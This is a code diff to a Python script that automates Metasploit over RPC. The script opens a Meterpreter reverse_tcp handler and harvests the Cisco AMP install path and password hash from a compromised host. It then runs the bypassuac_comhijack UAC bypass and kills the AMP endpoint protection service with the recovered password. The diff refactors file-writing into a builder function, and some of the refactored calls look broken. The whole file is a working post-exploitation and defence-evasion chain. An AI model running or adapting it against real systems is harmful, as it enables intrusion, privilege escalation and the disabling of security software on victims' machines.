@@ -1,22 +1,25 @@
 import os, msfrpc, optparse, sys, subprocess
 from time import sleep
  
-# GATHER OUR AMP LOCATION AND HASH
-def builder():
-     post = open('/tmp/smbpost.rc', 'w')
-     postcomms = """load python
-python_import -f /etc/amp/apf2.py
-"""
-     post.write(postcomms)
+# Function to create the MSF .rc files
+def builder(FILE,COMMS):
+     post = open(FILE, 'w')
+     post.write(COMMS)
      post.close()
  
 # START CONSOLE COMMANDS
 def sploiter(LHOST, LPORT, session):
+     # INITIATE RPC CONNECTION
      client = msfrpc.Msfrpc({})
-     client.login('msf', 'l01sHTWS')
+     client.login('msf', 'abc123')
      ress = client.call('console.create')
      console_id = ress['id']
- 
+
+     # BUILD AP2.PY RC FILE
+     builder('/tmp/smbpost.rc', """load python
+python_import -f /etc/amp/apf2.py
+""")
+     # SETUP HANDLER 
      commands = """use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST """+LHOST+"""
@@ -29,25 +32,17 @@ exploit
      result = res['data'].split('n')
    
  
-## Run Post-exploit script ##
+     # Run Post-exploit script 
      runPost = """use post/multi/gather/run_console_rc_file
 set RESOURCE /tmp/smbpost.rc
 set SESSION """+session+"""
 exploit
 """
      client.call('console.write',[console_id,runPost])
-     #sleep(2)
-     #rres = client.call('console.read',[console_id])
-     #print rres['data']
-     #test_shell = client.call('session.shell_read',[console_id])
      sleep(8)
      test_met = client.call('session.meterpreter_read',[session])
      SFC_PATH = test_met['data'].split('AMPDIR::')[1].split('::ENDDIR')[0]
      PASS_HASH = test_met['data'].split('AMPHASH::')[1].split('::ENDHASH')[0]
-
-
-     #print 'SHELL\n'
-     #print test_shell
      print '\nMETERPRETER\n'
      print str(SFC_PATH) + '\n'
      print str(PASS_HASH)
@@ -59,39 +54,31 @@ exploit
      AMP_PASS = AMP_PASS_REQ.split('Password is: <br><br>')[1].split('<br><br><br>')[0]
      print 'PASSWORD: ' + str(AMP_PASS)
      print '[+]::BEGINNING UAC BYPASS'
-     posta = open('/tmp/smbposta.rc', 'w')
-     postacomms = """background
+
+     # BUILD UAC HIJACK RC TEMP FILE     
+     builder('/tmp/smbposta.rc',"""background
 use exploit/windows/local/bypassuac_comhijack
 set payload windows/x64/meterpreter/reverse_tcp
 set session """+session+"""
 set lhost """+LHOST+"""
 set lport 4488
 exploit
-"""
-     posta.write(postacomms)
-     posta.close()
+""")
+     # EXECUTE UAC RC FILE
      runPosta = """use post/multi/gather/run_console_rc_file
 set RESOURCE /tmp/smbposta.rc
 set SESSION """+session+"""
 exploit
 """
-
      client.call('console.write',[console_id,postacomms])
      sleep(3)
-     #print client.call('console.read',[console_id])
-     sleep(15)
-
-
-
+     sleep(12)
+     
+     #BUILD AND EXECUTE AMP SERVICE KILLER
      print '[+]::KILLING AMP'
      client.call('console.read',[console_id])
-     
-
-     postb = open('/tmp/smbpostb.rc', 'w')
-     postbcomms = """execute -f 'cmd.exe /c \""""+SFC_PATH+"""\" -k """+AMP_PASS+"""'
-"""
-     postb.write(postbcomms)
-     postb.close()
+     builder('/tmp/smbpostb.rc', """execute -f 'cmd.exe /c \""""+SFC_PATH+"""\" -k """+AMP_PASS+"""'
+""")
      ELEV_SESS = int(session) + 1
      print ELEV_SESS
      runPostb = """background
@@ -101,13 +88,9 @@ set RESOURCE /tmp/smbpostb.rc
 set SESSION """+str(ELEV_SESS)+"""
 exploit
 """
-    
      client.call('console.write',[console_id,runPostb])
      client.call('session.meterpreter_read',[session])
-     #print client.call('session.list')
-     
-     #print client.call('session.list',[console_id])
-     #print client.call('session.shell_write',[session,ampkillcomm])
+  
      
  
  
@@ -128,7 +111,7 @@ def main():
                 print parser.usage
                 sys.exit(0)
  	RHOST = ''
-        builder()
+        builder(LHOST, LPORT)
         sploiter(LHOST, LPORT, session)
  
 if __name__ == "__main__":
